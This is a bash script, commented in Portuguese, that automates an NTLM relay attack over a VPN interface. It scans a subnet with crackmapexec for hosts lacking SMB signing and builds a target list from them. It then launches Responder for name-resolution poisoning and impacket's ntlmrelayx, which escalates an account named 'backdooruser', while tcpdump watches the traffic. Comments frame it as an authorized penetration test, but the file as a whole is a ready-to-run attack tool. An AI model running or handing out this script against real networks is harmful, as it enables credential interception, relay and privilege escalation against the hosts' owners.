#!/bin/bash

# VARIÁVEIS
IP="10.10.10.88"        # Substituir pelo IP autorizado da VPN
CIDR="24"               # Máscara da rede
IFACE="tun0"            # Interface VPN
RELAY_USER="backdooruser"  #"USUARIO_AUTORIZADO"
TARGETS="/tmp/relay_targets.txt"
SESSION="vpn_attack"

# === RESET DE SERVIÇOS QUE PODEM DAR CONFLITO ===
echo "[+] Limpando possíveis serviços em conflito (Apache, Responder antigo, etc)..."
sudo pkill responder 2>/dev/null
sudo pkill ntlmrelayx.py 2>/dev/null
sudo pkill tcpdump 2>/dev/null
sudo fuser -k 80/tcp 2>/dev/null
sudo fuser -k 445/tcp 2>/dev/null
sudo fuser -k 135/tcp 2>/dev/null

# === AJUSTA IP E ROTA ===
echo "[+] Corrigindo IP e rota..."
sudo ip addr flush dev $IFACE 

# Adiciona na interface VPN o IP autorizado para uso no teste.
# Substitua $IP pelo IP que será atribuído à sua máquina dentro da rede VPN.
# Exemplo: se sua máquina deve atuar como 10.10.10.88/24 na VPN, defina:
# IP="10.10.10.88"
# CIDR="24
sudo ip addr add $IP/$CIDR dev $IFACE 
sudo ip route add 10.50.103.0/24 dev $IFACE # Adiciona a rota para a rede interna autorizada no teste.
                                          # Substitua 10.50.103.0/24 pela faixa de rede interna acessível pela VPN.

# === ESCANEIA HOSTS COM SMB SIGNING DESATIVADO ===
echo "[+] Escaneando rede para hosts com SMB signing desativado..."

# Executa a varredura SMB na faixa de rede autorizada.
# Substitua 10.10.10.0/24 pela mesma rede interna usada na rota acima.
# Essa faixa deve representar o segmento onde estão os hosts Windows/SMB do escopo.
sudo crackmapexec smb 10.10.10.0/24 > /tmp/cme_scan.txt 

echo "[+] Gerando targets.txt com hosts vulneráveis..."
grep "Signing: False" /tmp/cme_scan.txt | cut -d " " -f 1 | sort -u | while read ip; do
    echo "smb://$ip"
done > "$TARGETS"

if [[ ! -s "$TARGETS" ]]; then
    echo "[!] Nenhum host vulnerável encontrado com Signing: False."
    echo "[!] Saindo."
    exit 1
fi

echo "[+] Alvos encontrados:"
cat "$TARGETS"
echo

# === INICIANDO TMUX MONITORAMENTO ===
echo "[+] Preparando tmux com Responder, ntlmrelayx e tcpdump..."
tmux kill-session -t $SESSION 2>/dev/null
tmux new-session -d -s $SESSION

# P1: Responder
tmux send-keys -t $SESSION "sudo responder -I $IFACE" C-m

# P2: ntlmrelayx com targets filtrados
tmux split-window -v -t $SESSION
tmux send-keys -t $SESSION "sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $TARGETS --escalate-user=$RELAY_USER" C-m

# P3: tcpdump monitorando tráfego
tmux split-window -h -t $SESSION:0.1
tmux send-keys -t $SESSION "sudo tcpdump -i $IFACE -nn port 137 or port 138 or port 445 or port 53 or port 80" C-m

tmux select-pane -t 0
tmux attach-session -t $SESSION

